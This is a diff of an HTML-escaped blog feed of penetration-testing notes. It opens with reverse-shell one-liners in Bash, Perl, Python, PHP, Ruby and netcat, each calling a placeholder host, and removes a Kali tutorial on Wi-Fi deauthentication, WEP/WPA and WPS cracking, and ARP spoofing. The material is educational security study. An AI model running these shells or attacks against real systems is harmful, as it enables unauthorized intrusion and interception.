 &lt;p&gt;Following this are a list of commands that you could execute to get a reverse connection for different supported languages. Where the variable to change denoted by &lt;code&gt;[HOST_IP]&lt;/code&gt; and optionally to change the port. Note that these are all 'one-liners' so they could be executed in input boxes.&lt;/p&gt;
 &lt;h4 id="bash"&gt;Bash&lt;/h4&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bash -i &amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt; /dev/tcp/&lt;span class="o"&gt;[&lt;/span&gt;HOST_IP&lt;span class="o"&gt;]&lt;/span&gt;/8080 &lt;span class="m"&gt;0&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bash -i &amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt; /dev/tcp/&lt;span class="o"&gt;[&lt;/span&gt;HOST_IP&lt;span class="o"&gt;]&lt;/span&gt;/8080 &lt;span class="m"&gt;0&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;h4 id="perl"&gt;PERL&lt;/h4&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;perl&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt; &lt;span class="s"&gt;'use Socket;$i="[HOST_IP]";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&amp;gt;&amp;amp;S");open(STDOUT,"&amp;gt;&amp;amp;S");open(STDERR,"&amp;gt;&amp;amp;S");exec("/bin/sh -i");};'&lt;/span&gt;
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;perl&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt; &lt;span class="s"&gt;'use Socket;$i="[HOST_IP]";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&amp;gt;&amp;amp;S");open(STDOUT,"&amp;gt;&amp;amp;S");open(STDERR,"&amp;gt;&amp;amp;S");exec("/bin/sh -i");};'&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;h4 id="python"&gt;Python&lt;/h4&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s1"&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST_IP]",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'&lt;/span&gt;
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s1"&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST_IP]",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;h4 id="php"&gt;PHP&lt;/h4&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="x"&gt;php -r '$sock=fsockopen("[HOST_IP]",8080);exec("/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3");'&lt;/span&gt;
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="x"&gt;php -r '$sock=fsockopen("[HOST_IP]",8080);exec("/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3");'&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;h4 id="ruby"&gt;Ruby&lt;/h4&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;ruby&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rsocket&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="s1"&gt;'f=TCPSocket.open("[HOST_IP]",8080).to_i;exec sprintf("/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d",f,f,f)'&lt;/span&gt;
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;ruby&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rsocket&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="s1"&gt;'f=TCPSocket.open("[HOST_IP]",8080).to_i;exec sprintf("/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d",f,f,f)'&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;h4 id="netcat"&gt;Netcat&lt;/h4&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc -e /bin/sh &lt;span class="o"&gt;[&lt;/span&gt;HOST_IP&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;8080&lt;/span&gt;
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc -e /bin/sh &lt;span class="o"&gt;[&lt;/span&gt;HOST_IP&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;8080&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;h3 id="local-file-inclusion"&gt;Local File Inclusion&lt;/h3&gt;
@@ -473,7 +606,7 @@
 &lt;ol&gt;
 &lt;li&gt;create a php file with the following:&lt;/li&gt;
 &lt;/ol&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
 2
 3
 4
@@ -852,290 +985,4 @@ Two types of attacks:&lt;/p&gt;
 &lt;li&gt;&lt;code&gt;set subnet [subnet]&lt;/code&gt; - Set the subnet to the first 3 dots then 0 ie. xx.xx.xx.0&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;set session [id]&lt;/code&gt; - Sets the session to run it on.&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;exploit&lt;/code&gt;&lt;/li&gt;
-&lt;/ol&gt;&lt;/body&gt;</content><category term="Software"></category><category term="software"></category><category term="infosec"></category></entry><entry><title>Network Hacking with Kali Linux</title><link href="https://jackmckew.dev/network-hacking-with-kali-linux.html" rel="alternate"></link><published>2020-08-28T00:00:00+10:00</published><updated>2020-08-28T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-08-28:/network-hacking-with-kali-linux.html</id><summary type="html">&lt;body&gt;&lt;p&gt;This post will go into ways we can use Kali Linux to hack networks and PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: &lt;a href="https://www.kali.org/downloads/"&gt;https://www.kali …&lt;/a&gt;&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;body&gt;&lt;p&gt;This post will go into ways we can use Kali Linux to hack networks and PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: &lt;a href="https://www.kali.org/downloads/"&gt;https://www.kali.org/downloads/&lt;/a&gt;. These are notes from the Udemy course: &lt;a href="https://www.udemy.com/course/learn-ethical-hacking-from-scratch/"&gt;https://www.udemy.com/course/learn-ethical-hacking-from-scratch/&lt;/a&gt;, highly recommend this course, very practical and beginner friendly.&lt;/p&gt;
-&lt;p&gt;This post is apart of a series of posts, see the other posts at:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="https://jackmckew.dev/gaining-access-with-kali-linux.html"&gt;Gaining Access with Kali Linux&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://jackmckew.dev/web-penetration-testing-with-kali-linux.html"&gt;Web Penetration Testing with Kali Linux&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;blockquote&gt;
-&lt;p&gt;Thank you to Chris B for helping me with the notes in this post below!&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h2 id="table-of-contents"&gt;Table of Contents &lt;!-- omit in toc --&gt;&lt;/h2&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="#network-hacking"&gt;Network Hacking&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="#networking-fundamentals"&gt;Networking Fundamentals&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="#checking-network-configuration"&gt;Checking Network Configuration&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#checking-wireless-networks"&gt;Checking Wireless Networks&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#sniffing-data-from-specific-device"&gt;Sniffing Data from Specific Device&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#deauthentication-attack"&gt;DeAuthentication Attack&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href="#gaining-access"&gt;Gaining Access&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="#cracking-wep"&gt;Cracking WEP&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#fake-authentication-attack"&gt;Fake Authentication Attack&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href="#cracking-wpawpa2"&gt;Cracking WPA/WPA2&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="#with-wps"&gt;With WPS&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#without-wps"&gt;Without WPS&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href="#securing-your-network"&gt;Securing your Network&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#post-connection-attacks-mitm-attacks"&gt;Post Connection Attacks (MITM Attacks)&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="#discovering-devices-on-the-network"&gt;Discovering Devices on the Network&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="#netdiscover"&gt;NetDiscover&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#nmap"&gt;Nmap&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href="#arp-attack"&gt;ARP Attack&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="#bettercap"&gt;BetterCap&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href="#https"&gt;HTTPS&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#dns-spoofing"&gt;DNS Spoofing&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#javascript-code-injection"&gt;JavaScript Code Injection&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href="#wireshark"&gt;WireShark&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#creating-a-honeypot-fake-access-point"&gt;Creating a Honeypot (fake access point)&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#detection--security"&gt;Detection &amp;amp; Security&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="#detecting-arp-attacks"&gt;Detecting ARP Attacks&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#preventing-mitm-attacks"&gt;Preventing MITM Attacks&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id="network-hacking"&gt;Network Hacking&lt;/h2&gt;
-&lt;h3 id="networking-fundamentals"&gt;Networking Fundamentals&lt;/h3&gt;
-&lt;h4 id="checking-network-configuration"&gt;Checking Network Configuration&lt;/h4&gt;
-&lt;p&gt;Commands to use in terminal to check network state:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;ifconfig&lt;/code&gt; for all connection states&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;iwconfig&lt;/code&gt; for all &lt;strong&gt;wireless&lt;/strong&gt; connection states&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;The MAC address (specified by manufacturer) will be listed in &lt;code&gt;ifconfig&lt;/code&gt; under &lt;code&gt;ether&lt;/code&gt;. You can alter the MAC address in memory directly by:&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Disabling that adapter &lt;code&gt;ifconfig eth0 down&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;Reassign a new MAC address &lt;code&gt;ifconfig eth0 hw ether 00:11:22:33:44:55&lt;/code&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;blockquote&gt;
-&lt;p&gt;The MAC address will be reset upon restarting or reconnecting the device.&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h4 id="checking-wireless-networks"&gt;Checking Wireless Networks&lt;/h4&gt;
-&lt;p&gt;We can seek out wireless networks using &lt;code&gt;airodump-ng&lt;/code&gt;. Ensure that your wireless access point (typically USB device) is in monitor mode with &lt;code&gt;iwconfig wlan0 mode monitor&lt;/code&gt;. Now we can listen to available networks with &lt;code&gt;airodump-ng mon0&lt;/code&gt; (where &lt;code&gt;mon0&lt;/code&gt; is the access point in monitor mode). To listen on a variety of bands (eg, 2.4GHz and 5GHz), use the command &lt;code&gt;airodump-ng --band abg mon0&lt;/code&gt;.&lt;/p&gt;
-&lt;h4 id="sniffing-data-from-specific-device"&gt;Sniffing Data from Specific Device&lt;/h4&gt;
-&lt;p&gt;To sniff data to a file, the command &lt;code&gt;airodump-ng --bssid [MAC] --channel [network_channel] --write [file_name] [wireless card]&lt;/code&gt;. This will sniff the data being transmitted by this device, and write it to a series of files. This data can later be analysed by programs like WireShark (because the data captured is potentially encrypted).&lt;/p&gt;
-&lt;h4 id="deauthentication-attack"&gt;DeAuthentication Attack&lt;/h4&gt;
-&lt;p&gt;This is a denial of service attack, but specifically for use in a Wi-Fi context. Ensuring to run &lt;code&gt;airodump-ng&lt;/code&gt; at the same time during this attack. This is achieved with &lt;code&gt;aireplay-ng&lt;/code&gt; and all that is required is to know the target MAC address (which is available in generic network sniffing (see above)).&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;aireplay-ng -D --deauth [#deauthPackets] -a [NetworkMAC] -c [TargetMAC] [wifi card]&lt;/code&gt;&lt;/p&gt;
-&lt;h3 id="gaining-access"&gt;Gaining Access&lt;/h3&gt;
-&lt;h4 id="cracking-wep"&gt;Cracking WEP&lt;/h4&gt;
-&lt;ol&gt;
-&lt;li&gt;Capture a large amount of packets &lt;code&gt;airodump-ng --bssid [MAC] --channel [network_channel] --write [file_name] [wireless card]&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;run &lt;code&gt;aircrack-ng [filename.cap]&lt;/code&gt; (leave step 1 running in the background)&lt;ul&gt;
-&lt;li&gt;To connect with ascii found, copy paste and connect!&lt;/li&gt;
-&lt;li&gt;TO CONNECT WITH KEY FOUND!, copy the key after the text provided in the square brackets, remove the colons [:], and copy paste that number when the Wi-Fi asks for a password.&lt;/li&gt;
-&lt;li&gt;If the network is not busy and not enough packets are being sent force the network to make packets (see step 3 in &lt;a href="#fake-authentication-attack"&gt;Fake Authentication Attack&lt;/a&gt;)&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h4 id="fake-authentication-attack"&gt;Fake Authentication Attack&lt;/h4&gt;
-&lt;ol&gt;
-&lt;li&gt;run &lt;code&gt;airodump-ng --bssid [MAC] --channel [network_channel] --write [file_name] [wireless card]&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;run &lt;code&gt;aireplay-ng --fakeauth [number of times (0 for 1 time)] -D -a [TargetMAC] -h [YOUR_WirelessAdapter_MAC] [WirelessAdapter (wlan0) ]&lt;/code&gt;&lt;ul&gt;
-&lt;li&gt;(Note in monitor mode MAC is the first 12 digits after unspec + replace [-] with [:] )&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;make sure your associated with the network (step 2) and run &lt;code&gt;aireplay-ng --arpreplay -b [TargetMAC] -h [YOUR_WirelessAdapter_MAC] [WirelessAdapter (wlan0) ]&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;then run the crack &lt;code&gt;aircrack-ng [filename.cap]&lt;/code&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;blockquote&gt;
-&lt;p&gt;may want to leave all 3 running at once&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h3 id="cracking-wpawpa2"&gt;Cracking WPA/WPA2&lt;/h3&gt;
-&lt;p&gt;For cracking WPA or WPA2, look out for WPS, this will enable the hack to much simpler as WPS is an 8 digit pin. Otherwise same attack as &lt;a href="#cracking-wep"&gt;WEP&lt;/a&gt;, but will take longer as WPA/WPA2 were designed to solve WEP's problems, thus more secure.&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;WPS is only available if the router supports WPS (and not PBS(push button authentication))&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h4 id="with-wps"&gt;With WPS&lt;/h4&gt;
-&lt;ol&gt;
-&lt;li&gt;to find all networks with WPS enabled use &lt;code&gt;wash --interface [WirelessAdapter]&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;to attack a network with WPS:&lt;ol&gt;
-&lt;li&gt;run fake auth on the router &lt;code&gt;aireplay-ng --fakeauth [number of times (0 for 1 time)] -D -a [TargetMAC] -h [YOUR_WirelessAdapter_MAC] [WirelessAdapter (wlan0) ]&lt;/code&gt; + leave airodump-ng in background (see WEP step 1)&lt;/li&gt;
-&lt;li&gt;use reaver &lt;code&gt;reaver --bssid [targetMAC] --channel [channel] --interface [WirelessAdapter] -vvv --no-associate&lt;/code&gt;
-    &amp;gt; if reaver doesn't work use this version of reaver &lt;a href="https://ufile.io/lro4nkdv"&gt;https://ufile.io/lro4nkdv&lt;/a&gt; make sure you run &lt;code&gt;chmod +x reaver&lt;/code&gt; then &lt;code&gt;./reaver [your command here]&lt;/code&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h4 id="without-wps"&gt;Without WPS&lt;/h4&gt;
-&lt;ol&gt;
-&lt;li&gt;monitor and write to a file&lt;/li&gt;
-&lt;li&gt;deauthenticate a client to capture handshake&lt;/li&gt;
-&lt;li&gt;create a word list:&lt;ol&gt;
-&lt;li&gt;Download a word list off the internet or:&lt;ul&gt;
-&lt;li&gt;Crunch can be used to create a word list using &lt;code&gt;crunch [min] [max] [characters] -t [pattern] -o [filename]&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;Need handshake + word list to crack WPA&lt;/li&gt;
-&lt;li&gt;to begin cracking the password use &lt;code&gt;aircrack-ng [.cap file] -w [wordlist]&lt;/code&gt;&lt;ul&gt;
-&lt;li&gt;methods to speedup&lt;ol&gt;
-&lt;li&gt;use online services with handshake &amp;amp; word list&lt;/li&gt;
-&lt;li&gt;use GPU for cracking&lt;/li&gt;
-&lt;li&gt;use rainbow tables&lt;/li&gt;
-&lt;li&gt;pipe word list as it is being created&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id="securing-your-network"&gt;Securing your Network&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;Ensure WPA2 is used with a long, complex password with letters, special characters and numbers&lt;/li&gt;
-&lt;li&gt;Change the password to the router login (typically admin, admin)&lt;/li&gt;
-&lt;li&gt;Disable WPS&lt;/li&gt;
-&lt;li&gt;Specify exact MAC addresses to connect (visitors won't like this)&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="post-connection-attacks-mitm-attacks"&gt;Post Connection Attacks (MITM Attacks)&lt;/h3&gt;
-&lt;h4 id="discovering-devices-on-the-network"&gt;Discovering Devices on the Network&lt;/h4&gt;
-&lt;p&gt;Need to gather information (MAC, IP etc.), there are programs that do for you = NetDiscover, Nmap.&lt;/p&gt;
-&lt;h5 id="netdiscover"&gt;NetDiscover&lt;/h5&gt;
-&lt;ul&gt;
-&lt;li&gt;to use NetDiscover &lt;code&gt;netdiscover -r [ip_range (can only access IPs on the same subnet eg. 10.0.2.xx ends at 254 so eg. 10.0.2.1/24 /24 means all IPs]&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;use your ip address with the last .xx being .1&lt;/li&gt;
-&lt;li&gt;if using wireless card use &lt;code&gt;-i [wirelessCard]&lt;/code&gt; before &lt;code&gt;-r&lt;/code&gt; or just connect to the network.&lt;/li&gt;
-&lt;li&gt;if not finding anything try (interface only if using Wi-Fi, MUST BE IN MANAGED/AUTO MODE)&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;netdiscover -i &amp;lt;interface&amp;gt; &amp;lt;gateway IP/8&amp;gt;&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;netdiscover -i &amp;lt;interface&amp;gt; &amp;lt;gateway IP/16&amp;gt;&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;netdiscover -i &amp;lt;interface&amp;gt; &amp;lt;gateway IP/24&amp;gt;&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;To make sure of the gateway IP address, please route -n&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h5 id="nmap"&gt;Nmap&lt;/h5&gt;
-&lt;blockquote&gt;
-&lt;p&gt;Zenmap is the graphical user interface of Nmap use &lt;zenmap&gt;&lt;/zenmap&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;ol&gt;
-&lt;li&gt;in the target  use your network with xx at the end eg. 10.0.2.1/24 (see above &lt;a href="#netdiscover"&gt;NetDiscover&lt;/a&gt;)&lt;/li&gt;
-&lt;li&gt;in the profiles there are a number of default commands to use. (ping scan might not list everything)&lt;/li&gt;
-&lt;li&gt;use info found to work out things eg. does this model router have any exploits or the phone brand is samsung meaning it's running on android&lt;/li&gt;
-&lt;li&gt;Quick Scan(profile) - also shows open ports and the services running on these ports eg. if port 80 is open a webserver is running.&lt;/li&gt;
-&lt;li&gt;Quick scan plus - Quick scan but also shows Operating system, device type and the programs and program versions running on the ports.&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;&lt;img alt="Nmap" class="img-fluid" src="https://jackmckew.dev/img/nmap.png"/&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;Fun Note: when you jailbrake an iOS device it auto installs an ssh server with default password being: alpine, and uname: root, use &lt;code&gt;ssh root@[phone/server_ip]&lt;/code&gt; then enter yes and alpine&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h4 id="arp-attack"&gt;ARP Attack&lt;/h4&gt;
-&lt;p&gt;Address Resolution Protocol (ARP) allows us to link ip addresses to MAC addresses.&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;ARP request sends a signal to all clients on the network asking who has this XXX IP the IP will respond with it's MAC address&lt;/li&gt;
-&lt;li&gt;goal is to trick the router into thinking you are the victim and the victim into thinking you are the router. (Man in the Middle)&lt;/li&gt;
-&lt;li&gt;Use program ARPspoof &lt;code&gt;arpspoof -i [interface(wificard)] -t [clientip] [gatewayip]&lt;/code&gt; and then &lt;code&gt;arpspoof -i [interface(wificard)] -t [gatewayip] [clientip]&lt;/code&gt;&lt;ul&gt;
-&lt;li&gt;There is also a tool called bettercap (more features).&lt;/li&gt;
-&lt;li&gt;ARPspoof is not default installed use &lt;code&gt;apt-get update &amp;amp;&amp;amp; apt-get install -y dsniff&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;Packets will be blocked by default on linux to allow packets to flow though on linux use &lt;code&gt;echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward&lt;/code&gt; (echo 0 to revert)&lt;/li&gt;
-&lt;/ul&gt;
